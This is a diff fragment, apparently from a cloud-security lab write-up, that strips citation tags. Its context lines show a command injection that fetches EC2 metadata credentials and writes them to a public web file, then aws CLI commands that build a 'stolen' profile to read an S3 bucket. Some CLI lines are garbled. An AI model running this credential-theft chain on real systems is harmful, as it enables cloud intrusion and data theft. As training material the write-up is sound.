@@ -60,7 +60,7 @@ TOKEN= curl -X PUT "[http://169.254.169.254/latest/api/token](http://169.254.169
 CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL |
 echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN") &&
 echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json')}
-``` [cite: 785, 786, 787, 788, 789, 790]
+``` 
 
 ![Command Injection](images/username-field.png) 
 
@@ -81,7 +81,7 @@ AWS CloudShell was utilized to configure a new CLI profile using the stolen Acce
 ```bash
 $aws configure set profile.stolen.region ap-southeast-1$ aws configure set profile.stolen.aws_access_key_id cat credentials.json | jq-r.AccessKeyId'
 $aws configure set profile.stolen.aws_secret_access_key cat credentials.json | jqr.SecretAccessKey"$ aws configure set profile.stolen.aws_session_token cat credentials.json | jqr.Token"
-``` [cite: 876, 877, 878, 879]
+```
 
 The attacker profile successfully accessed a secure S3 bucket and downloaded a file named secret-information.txt, completing the data exfiltration objective. 
 
